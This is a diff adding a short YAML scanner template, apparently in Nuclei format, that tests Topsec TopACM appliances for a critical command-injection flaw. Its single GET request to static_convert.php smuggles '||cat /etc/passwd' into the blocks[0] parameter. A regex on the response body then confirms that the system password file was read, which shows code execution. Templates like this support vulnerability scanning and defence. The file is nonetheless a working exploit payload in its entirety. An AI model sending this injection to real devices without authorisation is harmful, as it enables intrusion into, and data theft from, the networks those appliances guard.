@@ -1,0 +1,22 @@
+id: yaml-poc-topsec-topacm-command_injection-CT-456773
+info:
+  name: Yaml Poc Topsec Topacm Command_Injection Ct 456773
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-topsec-topacm-command_injection-CT-456773'
+  tags: rce
+  reference:
+  - https://planet.vulbox.com/detail/MTA4NDg=
+http:
+- method: GET
+  path:
+  - /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20/etc/passwd
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - root:[^:]*:[0-9]*:[0-9]*:[^:]*
